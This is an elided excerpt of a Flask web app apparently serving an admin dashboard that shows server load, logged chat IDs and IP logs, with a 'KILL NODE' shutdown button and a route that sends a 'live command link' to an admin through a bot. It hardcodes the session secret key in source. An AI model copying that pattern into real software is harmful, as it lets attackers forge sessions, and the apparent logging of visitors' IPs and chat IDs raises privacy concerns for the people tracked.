...
app = Flask(__name__)
app.secret_key = "enaful_ultra_v6_final_secure"
...
<head>
    ...
    <style>
        ...
        .btn { padding: 12px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; }
        ...
        h2 { font-size: 13px; color: #fff; border-bottom: 1px solid #0f0; display: inline-block; }
    </style>
</head>
<body>
    ...
    <div class="btn-group">
        ...
        <button class="btn btn-kill" onclick="if(confirm('Shutdown?')){location.href='/kill'}">🛑 KILL NODE</button>
    </div>
</body>
</html>
"""
...
def dashboard():
    ...
    return render_template_string(DASHBOARD_HTML, cpu=cpu, ram=ram, chat_ids=t_logs, ip_logs=i_logs, owner_user=OWNER_USERNAME.replace('@',''))

@app.route('/get_link')
def get_link():
    if session.get('logged_in'):
        data_bot.send_message(ADMIN_ID, f"🔗 **YOUR LIVE COMMAND LINK:** `{SERVER_URL}`")
        return "<script>alert('Link Sent to Admin Bot!'); window.location.href='/dashboard';</script>"
